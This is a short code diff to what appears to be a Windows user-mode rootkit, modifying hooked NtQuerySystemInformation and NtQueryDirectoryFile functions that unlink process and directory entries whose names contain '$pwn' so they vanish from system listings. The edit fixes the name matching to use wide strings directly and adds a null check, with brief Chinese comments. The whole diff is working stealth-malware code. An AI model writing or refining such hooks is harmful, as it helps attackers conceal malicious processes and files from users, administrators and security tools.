@@ -28,10 +28,12 @@ NTSTATUS WINAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
 			lpCurrentProcess = lpNextProcess;
 			lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)lpCurrentProcess + lpCurrentProcess->NextEntryOffset);
 
-			wcstombs_s(nullptr, lpCurrentProcessName, lpNextProcess->ImageName.Buffer, MAX_PATH);
-			lpCurrentProcessName[MAX_PATH - 1] = '\0';
+		//	wcstombs_s(nullptr, lpCurrentProcessName, lpNextProcess->ImageName.Buffer, MAX_PATH);
+		//	lpCurrentProcessName[MAX_PATH - 1] = '\0';
 
-			if (StrStrIA(lpCurrentProcessName, "$pwn"))
+			//if (StrStrIA(lpCurrentProcessName, "$pwn"))
+			if (lpNextProcess->ImageName.Buffer != nullptr &&  // 安全检查
+				StrStrIW(lpNextProcess->ImageName.Buffer, L"$pwn"))
 			{
 				if (lpNextProcess->NextEntryOffset == 0)
 					lpCurrentProcess->NextEntryOffset = 0;
@@ -60,10 +62,12 @@ NTSTATUS WINAPI hkNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_
 			lpCurrentDirectory = lpNextDirectory;
 			lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD_PTR)lpCurrentDirectory + lpCurrentDirectory->NextEntryOffset);
 
-			wcstombs_s(nullptr, lpCurrentDirectoryName, lpNextDirectory->FileName, MAX_PATH);
-			lpCurrentDirectoryName[MAX_PATH - 1] = '\0';
+			//wcstombs_s(nullptr, lpCurrentDirectoryName, lpNextDirectory->FileName, MAX_PATH);
+			//lpCurrentDirectoryName[MAX_PATH - 1] = '\0';
 
-			if (StrStrIA(lpCurrentDirectoryName, "$pwn"))
+			//if (StrStrIA(lpCurrentDirectoryName, "$pwn"))
+			if (StrStrIW(lpNextDirectory->FileName, L"$pwn"))  // 注意 L 前缀
+
 			{
 				if (lpNextDirectory->NextEntryOffset == 0)
 					lpCurrentDirectory->NextEntryOffset = 0;
